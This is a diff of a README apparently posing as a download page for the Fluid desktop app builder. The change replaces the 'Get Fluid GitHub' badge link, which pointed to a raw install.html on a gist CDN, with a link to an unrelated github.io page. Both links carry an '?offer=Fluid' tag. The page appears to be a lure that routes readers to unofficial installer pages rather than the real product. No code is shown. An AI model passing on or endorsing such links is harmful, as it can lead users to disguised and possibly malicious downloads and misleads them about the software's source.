@@ -1,6 +1,6 @@
 # Fluid For PC Download — Desktop Site App Builder
 
-[![Get Fluid GitHub](https://img.shields.io/badge/Get%20Fluid%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/midas78matteoscott/450962461f777f14157e2d529c81fa5c/raw/4fe9afa9f69d02a6fa6d45e744ed9f90a3bae145/install.html?offer=Fluid)
+[![Get Fluid GitHub](https://img.shields.io/badge/Get%20Fluid%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=Fluid)
 
 ## 🎯 What You Get
 - ✅ 🌐 Turn websites into desktop apps  
